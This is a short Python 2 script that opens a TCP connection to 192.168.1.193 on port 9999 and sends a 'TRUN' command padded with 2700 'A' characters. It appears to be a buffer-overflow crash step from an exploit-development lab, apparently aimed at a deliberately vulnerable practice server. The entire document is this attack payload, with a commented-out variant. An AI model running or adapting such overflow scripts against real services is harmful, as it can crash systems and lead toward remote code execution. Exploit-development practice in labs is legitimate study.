#!/usr/bin/python
import socket
import sys
from time import sleep

buffer = "A" * 2700

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.193', 9999))
    s.send(('TRUN /../: '+ buffer+'\r\n'))
    #s.send(('TRUN .' + buffer + '\r\n'))
    print s.recv(1024)
    s.close()
except:
    print "no connection to server"



